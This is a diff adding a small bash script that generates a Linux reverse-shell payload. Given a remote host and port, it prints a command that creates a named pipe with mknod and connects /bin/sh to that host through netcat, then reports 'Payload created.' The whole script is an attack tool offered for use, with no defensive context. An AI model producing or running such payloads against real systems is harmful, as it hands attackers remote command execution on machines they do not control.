@@ -1,0 +1,22 @@
+#!/bin/bash
+
+function Craft_mknod_and_netcat_reverse_shell(){
+
+        if [ -z "$1" ] || [ -z "$2" ]
+        then
+                printf "Auto-gen Linux mknod + netcat reverse tcp shell\n"
+                printf "Usage bash linux_mknod_nc-reverse-tcp <rhost> <rport>\n"
+                exit
+        fi
+
+        rhost="$1"
+        rport="$2"
+
+	printf "\n"
+        printf "mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc $rhost $rport 1>/tmp/backpipe"
+	printf "\n\n[\e[0;32m+\e[0m] Payload created.\n"
+
+}
+
+
+Craft_mknod_and_netcat_reverse_shell "$1" "$2"
